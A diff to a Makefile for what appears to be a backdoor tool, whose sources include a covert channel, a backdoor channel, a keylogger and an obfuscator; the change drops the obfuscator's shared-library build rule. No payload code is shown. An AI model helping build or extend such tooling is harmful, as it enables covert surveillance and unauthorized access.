@@ -7,17 +7,13 @@ SRCFILES    =src/covert_channel/utilities.cpp \
 			 src/covert_channel/covert_channel.cpp \
 			 src/covert_channel/backdoor_channel.cpp \
 			 src/file_watcher/file_watcher.cpp \
-			 src/obfuscator/refork.c \
 			 src/keylogger/keylogger.cpp src/backdoor.cpp
 
 all: $(PROG_NAME)
 
 
-$(PROG_NAME): $(SRCFILES) #bin/refork.so
-	g++ $(CFLAG) -o bin/$(PROG_NAME)  $(SRCFILES) $(CLIB)
-
-bin/refork.so: src/obfuscator/refork.c
-	g++ -shared -fPIC src/obfuscator/refork.c -o bin/refork.so
+$(PROG_NAME): $(SRCFILES)# refork.so
+	g++ $(CFLAG) -o bin/$(PROG_NAME) $(SRCFILES) $(CLIB)
 
 clean:
 	rm -f bin/* build/*.o
